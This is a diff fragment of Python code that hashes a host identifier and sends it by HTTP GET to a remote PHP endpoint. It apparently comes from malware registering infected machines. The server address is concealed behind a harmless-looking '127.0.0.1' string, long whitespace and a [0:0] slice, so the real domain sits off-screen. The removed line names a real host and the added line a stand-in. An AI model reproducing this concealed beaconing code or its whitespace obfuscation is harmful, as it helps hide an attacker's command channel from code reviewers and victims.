@@ -11,8 +11,8 @@ host_id = gethostname()+hex(randint(0,987654321))
 h = sha1()
 h.update(host_id.encode())
 token = h.hexdigest()
-o = '127.0.0.1'                                                                                                                                                            [0:0]+'eedoshapira.000webhostapp.com'
-a = get('http://%s/respectable_establishment/cgi/new.php?s=%s' % (o, token))
+o = '127.0.0.1'                                                                                                                                                            [0:0]+'WEB_ADDR_STANDIN'
+a = get('http://%s/respectable_establishment/new.php?s=%s' % (o, token))
 
 def d_r(p,d):    
     try:
